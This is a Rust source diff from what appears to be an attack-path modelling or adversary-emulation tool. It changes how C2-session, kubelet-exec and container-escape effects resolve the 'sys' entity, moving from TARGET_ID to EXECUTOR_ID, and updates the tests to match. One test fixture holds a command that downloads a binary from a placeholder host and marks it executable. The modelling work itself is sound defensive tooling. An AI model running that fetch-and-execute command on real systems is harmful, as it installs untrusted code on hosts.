@@ -930,10 +930,12 @@ fn parse_c2_session_relation(
 
     // `sys` resolves to the entity the TTP executed on.
     let target_id = if args[1].eq_ignore_ascii_case("sys") {
-        ctx.get("TARGET_ID")
+        ctx.get("EXECUTOR_ID")
             .filter(|id| !id.is_empty())
             .map(String::as_str)
-            .ok_or_else(|| "c2.session: 'sys' requires TARGET_ID in context".to_string())?
+            .ok_or_else(|| {
+                "c2.session: 'sys' requires physical EXECUTOR_ID in context".to_string()
+            })?
     } else {
         args[1]
     };
@@ -1023,13 +1025,13 @@ fn parse_kubelet_exec_source_relation(
         return Err("kubelet-exec effect expects exactly 2 args".to_string());
     }
     // `sys` is a well-known placeholder for the entity that executed the TTP.
-    // Resolve it to the actual target entity ID stored in the context.
+    // Resolve it to persisted physical executor context, never the API target.
     let src = if args[0].eq_ignore_ascii_case("sys") {
-        ctx.get("TARGET_ID")
+        ctx.get("EXECUTOR_ID")
             .filter(|id| !id.is_empty())
             .map(String::as_str)
             .ok_or_else(|| {
-                "kubelet-exec: arg is 'sys' but TARGET_ID not present in context".to_string()
+                "kubelet-exec: 'sys' requires physical EXECUTOR_ID in context".to_string()
             })?
     } else {
         args[0]
@@ -1106,10 +1108,12 @@ fn parse_container_escape_relation(
 
     // `sys` resolves to the entity the TTP executed on.
     let src = if args[0].eq_ignore_ascii_case("sys") {
-        ctx.get("TARGET_ID")
+        ctx.get("EXECUTOR_ID")
             .filter(|id| !id.is_empty())
             .map(String::as_str)
-            .ok_or_else(|| "container.escape: 'sys' requires TARGET_ID in context".to_string())?
+            .ok_or_else(|| {
+                "container.escape: 'sys' requires physical EXECUTOR_ID in context".to_string()
+            })?
     } else {
         args[0]
     };
@@ -1397,6 +1401,7 @@ mod tests {
     fn c2_session_resolves_sys_target_from_context() {
         let mut args = ctx();
         args.insert("TARGET_ID".into(), "node/worker-1".into());
+        args.insert("EXECUTOR_ID".into(), "node/worker-1".into());
 
         let update = parse_effect("c2.session(sliver, sys)", &args).unwrap();
         let rel = update.new_relations[0]
@@ -1416,6 +1421,7 @@ mod tests {
     fn kubelet_exec_source_with_sys_preserves_marker_and_metadata() {
         let mut args = ctx();
         args.insert("TARGET_ID".into(), "ns/default/pod/attacker".into());
+        args.insert("EXECUTOR_ID".into(), "ns/default/pod/attacker".into());
         args.insert("PROCEDURE_CMD".into(), "ran-ws -- ${CMD}".into());
 
         let update = parse_effect("k8s.kubelet-exec-source(sys, all(k8s.node))", &args).unwrap();
@@ -1456,6 +1462,7 @@ mod tests {
     fn kubelet_exec_source_does_not_treat_installer_as_envelope() {
         let mut args = ctx();
         args.insert("TARGET_ID".into(), "ns/default/pod/attacker".into());
+        args.insert("EXECUTOR_ID".into(), "ns/default/pod/attacker".into());
         args.insert(
             "PROCEDURE_CMD".into(),
             "curl -o /tmp/ran-ws https://example/ran-ws && chmod +x /tmp/ran-ws".into(),
@@ -1794,9 +1801,10 @@ mod tests {
     }
 
     #[test]
-    fn container_escape_sys_resolves_to_target_id() {
+    fn container_escape_sys_resolves_to_physical_executor_id() {
         let mut args = ctx();
         args.insert("TARGET_ID".into(), "ns/default/pod/attacker".into());
+        args.insert("EXECUTOR_ID".into(), "ns/default/pod/attacker".into());
         args.insert("TARGET_NODE_ID".into(), "node/worker-1".into());
         let update = parse_effect("container.escape(sys)", &args).unwrap();
         let escape = update
